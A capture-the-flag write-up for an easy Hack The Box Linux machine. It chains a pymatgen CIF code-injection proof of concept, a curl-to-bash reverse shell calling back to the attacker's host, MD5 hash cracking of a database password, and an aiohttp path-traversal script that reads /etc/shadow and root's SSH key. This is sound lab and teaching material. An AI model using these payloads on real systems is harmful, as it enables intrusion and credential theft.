---
tags:
  - Linux
  - HTTP
  - Insecure File Upload
  - localhost service
  - CVE
---

... is a easy HTB machine which has a `http` with a `CIF` file upload and render. A public exploit for this is available for `RCE`. The `ssh` password of a user can be found in the database. For privesc, a hidden service running a vulnerable version of a framework allows you to employ directory traversal to read arbitrary files.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Hail the `-sV` flag! Without using it, this port would have shown the service `upnp`. Instead, i now know that i can visit this port in a browser, which i do using `burpsuites` chrome browser on `http://$IP:5000`. The starting page tells me that this page offers a `Chemistry CIF Analyzer`. I can upload `CIF (Crystallographic Information Files)` to analyze them after logging in or registering.

### Initial Exploitation
The login window did not accept default credentials, nor did it show any signs of `SQL` injection. So i tried to register an account instead. That worked without problems, and gave me access to the `CIF` file upload. An example was also provided.

As i have never seen a `CIF` file before, i googled `CIF file exploit` and instantly found a [github advisory](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) which provided me with a `POC`, which makes use of `pythons` `builtin` functions to load the module `os` and execute the method `system`. The exploitation happens due to the risky use of `eval` on user provided input. To verify that it works, i uploaded the following `CIF` file which uses `ping` to send packets to my machine:
```python
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 3 <my-IP>");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
After uploading it, i inspect the received `ICMP` packages to see if any reach me:
```bash
sudo tcpdump -i tun0 icmp
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: is required for packet inspection
# -i: specify the interface. the HTB VPN uses tun0
# icmp: listen for Internet Control Message Protocol (in short, ping) messages
```

And yes, i do indeed receive 3 `ping`s! I remove the `ping -c 3` command to replace it with the following reverse shell initiator:
```bash
"bash -c '/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1'"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# bash -c: wraps the following command so that it explicitly gets executed by bash, not the current shell
# /bin/bash -i: launch the bash binary in interactive mode
# >&: redirect standard output and standard error to:
# /dev/tcp/<IP>/port: when the bash binary opens this path, it creates a TCP connection!
# 0>&1: STDIN (0) gets redirected (>) to where STDOUT (1) is pointing
```

The following listener should accept a reverse shell if i receive one:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

But it didn't work. the `'`s (or `"` if changed) in the payload probably messed up the `python` command. I tried encoding the reverse shell initiator in `base64` to then use `echo <b64> | base64 -d | /bin/bash -i`, but that also didn't work. It did work however to store the reverse shell initiator in a `revshell.sh` file, and then use this payload:
```bash
curl http://<my-IP>:1338/revshell.sh | /bin/bash -i
```
This fetches the content of my `revshell.sh` and puts it into `bash`! This gives me a reverse shell as `app`.

### Lateral Movement
As the user `app` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `rosa` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

As i have landed in the `/home/app` directory, i investigate the back-end logic of the `app.py` application. In there the first lines reveal the `database` connection logic:
```python
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```
This password is not reusable for `rosa`'s `ssh` access though. So i try accessing the database using the `sqlite3` CLI. The `database.db` is located to be in `/home/app/instance/database.db`. 

The `sqlite3` `cli` usually throws me into an interactive `sqlite3` shell, but within the reverse shell it's a bit wonky to use it. I could upgrade the reverse shell to make it interactive (or, i could serve the `database.db` file over a new `http` port so that i can view its content on my machine, but opening ports is suspicious...), but instead i simply append the command i want from the `sqlite3` shell so that it returns the output without creating that `shell` environment (`.tables` lists the tables):
```bash
sqlite3 database.db ".tables"
```
With the query `select * from user;` i receive the hash of `rosa`!

It seems to be a simple `MD5` hash, which is crackable using `mode 0` of `hashcat`:
```bash
hashcat -m 0 ./hash.txt ./rockyou.txt
```
This gives me the clear-text password to `rosa`'s `ssh`, which is `unicorniosrosados`. Alternatively, the clear-text to this hash can be found at the [CrackStation](https://crackstation.net/).

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`id` and `sudo -l` do not lead anywhere, but the `netstat` command shows an internal port of `8080`. I use the following flag during the `ssh` login to be able to access that port on my browser:
```bash
ssh -L 1337:localhost:8080 rosa@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# 1337: port on our machine which gets opened. If talked to, ssh will forward it to the target port. can be any port.
# localhost: the remote host we want to reach. NOT $IP, as we want to be localhost (127.0.0.1) on the target.
# 8080: the remote port which gets interacted with when interacting with port 1337 on the local machine.
```

I now visit `http://localhost:1337` in `burp`'s browser. The web-site itself does not reveal any cool functionality, but the `Server:` header in the response shows something unusual. The value is `Python/3.9 aiohttp/3.9.1`. A quick google search leads me to the `CVE-2024-23334`. 

That `CVE` stands for the vulnerability in `aiohttp`, where the option `follow_symlinks=True` results in no checks for the requested resource, if static resources are requested (e.g. `JS` or `CSS` files). If this option is enabled, users are able to read arbitrary files on the file-system as the account which is running this application. A quick `ps aux` as `rosa` reveals that the command `/usr/bin/python3.9 /opt/monitoring_site/app.py` was started by `root`. If the check is not in place, i can read arbitrary files as `root`. 

To test this vulnerability, i must first identify a static resource on the server. The `view-source` reveals that the `JS` files are stored in  `/assets/js/script.js`. So i write the following short `python` script which automatically searches for the specified file:
```python
import http.client
import sys

static_resource = "/assets/js/"
go_back = "../"
target_file = "etc/passwd"
conn = http.client.HTTPConnection("localhost", "1337")
for i in range(10):
        i_back = i * go_back
        endpoint = static_resource + i_back + target_file
        conn.request("GET", endpoint)
        resp = conn.getresponse()
        result = resp.read().decode(errors="ignore")
        if "404" not in result and result:
                print(result)
                sys.exit()
```
This reads the `/etc/passwd` file!

Using a file read with the user `root` the three following things can be tried:

- reading the `/root/root.txt`: very boring
- reading the `/root/.ssh/id_rsa` (`ssh` private key): very valid
- reading the `/etc/shadow` and cracking the password: also very valid, but may take a long time

As the first two approaches are self explanatory (use private key with `-i`), i also tried cracking the `shadow` hash. To do so, i first need to read it and save the line of the `root` user in a `shadow.txt` file. The line of `/etc/passwd` is also required in a `passwd.txt`. These two files can then be merged in a `hash.txt` using the binary `unshadow` (from the `john` suite):
```bash
unshadow passwd.txt shadow.txt > hash.txt
```
This can then be attempted to be cracked using
```bash
john --wordlist=./rockyou.txt hash.txt
```
But this didn't work. The approach of stealing the `ssh` private key works!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|File<br>upload| B[CIF<br>File];
  B -->|Injection| C[Python-code<br>execution];

  D[Python-code<br>execution] -->|read| E[SQLite3<br>database];
  E -->|Hash<br>cracking| F[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Port<br>forwarding| B[vulnerable<br>application];
  B -->|Path<br>traversal| C[root's<br>SSH-key];
  C --> D[SSH<br>access];
```